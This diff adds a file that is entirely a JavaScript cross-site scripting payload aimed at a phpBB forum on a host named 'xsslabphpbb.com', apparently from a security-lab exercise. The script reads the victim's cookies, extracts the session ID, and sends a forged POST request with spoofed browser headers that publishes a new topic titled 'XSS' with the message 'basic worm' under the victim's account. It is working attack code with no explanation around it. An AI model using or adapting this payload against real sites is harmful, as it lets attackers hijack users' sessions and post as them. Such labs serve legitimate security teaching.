@@ -1,0 +1,23 @@
+XSS
+<script>
+var Ajax=null;
+var cook = document.cookie;
+var readcook = cook.match(/sid=.+/);
+var sid = readcook[0];
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabphpbb.com/posting.php",true);
+Ajax.setRequestHeader("Host","www.xsslabphpbb.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.setRequestHeader("Cookie",cook);
+Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+Ajax.setRequestHeader("Accept-Language","en-us,en;q=0.5");
+Ajax.setRequestHeader("Accept-Encoding","gzip,deflate");
+Ajax.setRequestHeader("Accept-Charset","ISO-8859-1,utf-8;q=0.7,*;q=0.7");
+Ajax.setRequestHeader("Referer","http://www.xsslabphpbb.com/posting.php?mode=newtopic&f=1");
+Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11");
+var content="subject=XSS&addbbcode18=%23444444&addbbcode20=0&helpbox=Italic+text%3A+%5Bi%5Dtext%5B%2Fi%5D++%28alt%2Bi%29&message=basic+worm&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&"+sid+"&f=1&post=Submit";
+Ajax.send(content);
+</script>
+
